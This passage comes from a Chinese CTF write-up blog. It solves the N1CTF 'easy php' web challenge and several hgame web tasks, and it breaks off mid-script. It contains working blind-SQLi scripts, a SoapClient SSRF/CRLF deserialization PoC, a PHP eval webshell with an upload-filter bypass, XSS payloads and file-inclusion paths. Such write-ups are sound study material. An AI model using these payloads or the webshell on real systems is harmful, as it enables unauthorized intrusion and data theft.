class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后发现views可以列目录 而且里面有个phpinfo可以查看,其他似乎没啥用.. 两个人一开始都是sql注入拿到admin的密码的.虽然sky大佬其实根本没有用到这个.... 给个脚本..我只跑了个表,其他的可以自己跑,反正什么都没有过滤....</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;10t38onft8uf1dv1p15ro7vjr5&#x27;</span>&#125;</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    ok=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        payload = <span class="string">&quot;aaa`,if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;char&#125;),sleep(3),1))#&quot;</span>.<span class="built_in">format</span>(num=num,char=char)</span><br><span class="line">        data = &#123;<span class="string">&#x27;signature&#x27;</span>:payload,<span class="string">&#x27;mood&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=u.post(<span class="string">&#x27;http://119.28.22.85:23333/index.php?action=publish&#x27;</span>,data=data,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(char),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="先看sky大佬的做法">先看sky大佬的做法</h4><p>sky大佬是看了session.upload_progress.enabled开启之后,包含session,但是因为cleanup开启,所以条件竞争发包拿shell 一个发session包 <img src="/images/2018/03/ezphp-sky-1.jpg" alt="blacsheep" /> 另一个请求session <img src="/images/2018/03/ezphp-sky-2.jpg" alt="blacsheep" /> 过一段时间去app目录拿菜刀连一下 <img src="/images/2018/03/ezphp-sky-3.jpg" alt="blacsheep" /> 然后看一下根目录的run.sh 找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD(&#x27;Nu1Lctf%#~:p&#x27;) WHERE user=&#x27;root&#x27;;FLUSH PRIVILEGES;&quot;</span><br></pre></td></tr></table></figure><p>然后就连一下数据库 <img src="/images/2018/03/ezphp-sky-4.jpg" alt="blacsheep" /> 然后连着看一下 <img src="/images/2018/03/ezphp-sky-5.jpg" alt="blacsheep" /> 拿到flag:n1ctf{php_unserialize_ssrf_crlf_injection_is_easy:p} ssrf_crlf.... 这就明显非预期了...</p><h4 id="官方wp">官方wp</h4><p>官方的方法是反序列化那里,使用soapclient来构造ssrf,然后通过crlf发包登录,传马拿shell的,后面的都是一样的,不过我自己复现的时候从来都没有成功...打了payload之后虽然可以ssrf(用vps收到了发送的包),但是cookie并没有用,大概是玄学问题吧,后续等有时间复现成功了再来填坑吧...</p><h5 id="当天晚上更新">当天晚上更新</h5><p>打把文明5感觉舒服多了,回来把这个洞再打了一遍,终于找到了问题... 这里就把官方的wp复现一下吧 首先,soapclient了解一下 看phpinfo,发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">soap</span><br><span class="line"></span><br><span class="line">Soap Client =&gt; enabled</span><br><span class="line">Soap Server =&gt; enabled</span><br></pre></td></tr></table></figure><p>然后学习一下SoapClient的用法,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">SoapClient</span>::<span class="variable constant_">SoapClient</span> ( <span class="keyword">mixed</span> <span class="variable">$wsdl</span> [, <span class="keyword">array</span> <span class="variable">$options</span> ] )</span><br></pre></td></tr></table></figure><p>然后第一个wsdl指的是web服务器的描述语言,xml之类的东西,这个无所谓,填null就好,后面的可以指定user-agent,location之类的,给个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$soapclient</span> = <span class="keyword">new</span> <span class="title function_ invoke__">soapclient</span>(<span class="string">&#x27;http://www.soap.com/soap.php?wsdl&#x27;</span>,</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;stream_context&#x27;</span> =&gt; <span class="title function_ invoke__">stream_context_create</span>(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>=&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;PHP/SOAP&#x27;</span>)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>返回的信息里ua就是PHP/SOAP了,最后还有个uri参数,会被传到SoapAction里,但是这个参数覆盖不了content-length,就不能控制我们要的登录,所以我们选择在ua那里crlf,方法如下: 给出官方的poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/index.php?action=login&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;username=admin&amp;password=nu1ladmin&amp;code=2218631&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Cookie: PHPSESSID=4deuuh449h5p807s0nid2k6i75&#x27;</span></span><br><span class="line"> );</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先自己创建一个帐号,撞md5脚本简单写一个就好 然后去publish界面发表,burp抓包,发到repeater 然后再开一个浏览器,或者清掉cookie也行(清cookie的话请把返回主界面的包也抓了),刷新一下获取一个没有登录的cookie,然后code自己脚本撞一下,写到前面的php脚本里面,headers里面的cookie换没有登录的号的cookie,因为登录是使用新的cookie,跑一下,得到一串hex码,然后burp发包 <img src="/images/2018/03/ez-php-official-1.jpg" alt="blacsheep" /> 在signature处注入,覆盖掉mood,使我们的soapclient对象可以反序列化从而完成ssrf (之前很蠢,没有控code,所以一直没有登录成功...XD..) 成功publish之后我们去访问一下index让我们的注入反序列化. ok,到这里我们再把cookie换成之前php脚本里写的cookie我们就是管理员了 <img src="/images/2018/03/ez-php-official-2.jpg" alt="blacsheep" /> 然后审一下上传的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file_size</span>  = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span>&gt;<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pic is too big!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span>!=<span class="string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="variable">$file_type</span>!=<span class="string">&#x27;image/pjpeg&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file type invalid&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$uploaded_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> =  <span class="string">&quot;/app/adminpic&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$user_path</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="variable">$file_true_name</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        <span class="variable">$move_to_file</span> = <span class="variable">$user_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_true_name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_file</span>,<span class="variable">$move_to_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$move_to_file</span>),<span class="string">&#x27;&lt;?php&#x27;</span>)&gt;=<span class="number">0</span>)</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&#x27;sh /home/nu1lctf/clean_danger.sh&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$file_true_name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写个一句话上去就好了,当然我们还得绕过,然后这里提供两种思路 一种是常见的<?php绕过,phpinfo中可以看到开了短标签,所以可以<=绕过 当然也可以用常见的<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; language=&#x27;php&#x27;&gt;eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>另外一种是官方给的,第一次见,学习一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Using a feature of commands of linux</span><br><span class="line">When we create a file like -xaaaaaaa.jpg</span><br><span class="line">We could not delete it by rm * or rm *.jpg except rm -r adminpic/</span><br></pre></td></tr></table></figure><p>即我们可以在.jpg文件前面加上一个-让文件不被删除 两种方法都可以 传完了在自己去暴破一下muma的名称就好了,时间的话用时间转时间戳就好,rand(1,100)暴破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://119.28.22.85:23333/index.php?action=../../../../../../app/adminpic/1muma1521034659&#123;num&#125;.jpg&#x27;</span>.<span class="built_in">format</span>(num=num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(num)+<span class="string">&#x27;-&gt;&#x27;</span>+<span class="built_in">str</span>(r.status_code))</span><br></pre></td></tr></table></figure><p>然后同样可以拿到shell,拿到shell之后其他的都是一样的了</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame-webwp</title>
      <link href="/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"/>
      <url>/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="are-you-from-europe">Are you from Europe?</h3><p>cnss原题,就flag改了下,对了,似乎概率也被修改了....所以不能通过改参数的方式拿flag了.. flag:hgame{Th3\_Ch0seN\_0nE!}</p><h3 id="special-number">special number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_GET[&#x27;key&#x27;]))&#123;</span><br><span class="line">        $pattern = &#x27;/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ &#x27;;</span><br><span class="line">        $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">        if(preg_match($pattern,$key)===0)&#123;</span><br><span class="line">            echo &quot;格式错误&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $lock=&quot;******************&quot;;</span><br><span class="line">            $b = json_decode($key);</span><br><span class="line">            if($b==$lock)</span><br><span class="line">                echo $flag;</span><br><span class="line">            else</span><br><span class="line">                echo &quot;this is no special number&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>考的弱类型 0e绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10001/?key=0e123321123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;pHp_w34k_typing_s000_e4sy&#125;</span><br></pre></td></tr></table></figure><h3 id="can-u-find-me">can u find me?</h3><p>明示robots.txt 查看/f1aaaaaaaag.php 提示管理员才可以拿flag 改cookie hgame{78e01ee77a39ef4e}</p><h3 id="tell-me-what-you-want">tell me what you want</h3><p>get一个flag,发现要post,post之后提示要改xff然后ua啊referer啊什么的一堆东西不多写了 hgame{For9e\_hTTp\_iS\_N0T\_HArd}</p><h3 id="我们不一样">我们不一样</h3><p>strcmp,数组绕过 hgame{g3t\_f14g\_is\_so0000\_ez}</p><h3 id="random">Random?</h3><p>.swp文件泄漏vim -r random.php.swp拿源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$public</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;emmm&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$emmm</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;emmm&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_object</span>(<span class="variable">$emmm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$emmm</span>-&gt;<span class="keyword">public</span> = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">100000000</span>);</span><br><span class="line">    <span class="variable">$emmm</span>-&gt;secret = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">100000000</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$emmm</span>-&gt;<span class="keyword">public</span> == <span class="variable">$emmm</span>-&gt;secret) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br></pre></td></tr></table></figure><p>稍微看一下,引用绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$public</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$temp</span>=<span class="keyword">new</span> <span class="title function_ invoke__">emmm</span>();</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="keyword">public</span> = &amp;<span class="variable">$temp</span>-&gt;secret;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.203.108:10001/random.php?emmm=O:4:%22emmm%22:2:&#123;s:6:%22public%22;N;s:6:%22secret%22;R:2;&#125;</span><br></pre></td></tr></table></figure><p>拿到flag: hgame{&\_Is\_wondeRful!@#}</p><h3 id="草莓社区-2">草莓社区-2</h3><p>文件包含, php伪协议php://filter/read=convert.base64-encode/resource=../flag.php 拿到一个base64,解两次 hgame{!m4o\_pi4n\_ChaO\_hao\_kan!}</p><h3 id="草莓社区-1">草莓社区-1</h3><p>直接访问 http://118.25.18.223:10011/show_maopian.php?mao=../flag.php hgame{#Ma0\_pi4n\_haO\_k4n\_ma#}</p><h3 id="xss-1">xss-1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">charge</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/image/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/\(/</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;article&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/article&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后不允许交互 直接img标签.然后括号被过滤掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(-&gt;(</span><br><span class="line">)-&gt;)</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;1&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="xss-2">xss-2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">charge</span>(<span class="params">input</span>) &#123; </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/img/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/image/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/\(/</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/\&gt;/</span>,<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>; </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>然后用input标签的image属性绕</p><h5 id="payload">payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;image&quot; src=1 onerror=alert(1);&quot;</span><br></pre></td></tr></table></figure><h3 id="最简单的sql题">最简单的sql题</h3><p>万能密码 帐号随意 密码123'or'1'='1 hgame{@s0ng\_fen\_ti@}</p><h3 id="送分的sqli">送分的SQLi</h3><p>sqlmap -u http://118.25.18.223:10068/?id=1 -D week3_sqliiii2 -T f111aa4g --dump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------+---------------+-----------------------------------+</span><br><span class="line"> id     dajiangyoude   f111aaaggg_w3                     </span><br><span class="line">+-------+---------------+-----------------------------------+</span><br><span class="line"> 10086  kan_wo_gan_ma  hgame&#123;Th3_e4sist_sql_injeCti0n##&#125; </span><br><span class="line">+-------+---------------+-----------------------------------+</span><br></pre></td></tr></table></figure>hgame{Th3\_e4sist\_sql\_injeCti0n##}<h3 id="简单的sqli">简单的SQLi</h3><p>要求输入一个满足的值,使其hash的4-8位为目标值,然后再输入id,直接上脚本就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注:md5自己写,这个import的是我嫌麻烦自己加的</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(each)[<span class="number">4</span>:<span class="number">8</span>]==code:</span><br><span class="line">            <span class="keyword">return</span> each</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://118.25.18.223:10086/&#x27;</span>)</span><br><span class="line">ok=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">129</span>):</span><br><span class="line">        <span class="comment">#id_1= &quot;1&#x27; and (ascii(mid((select group_concat(table_name) from information_schema.tables where 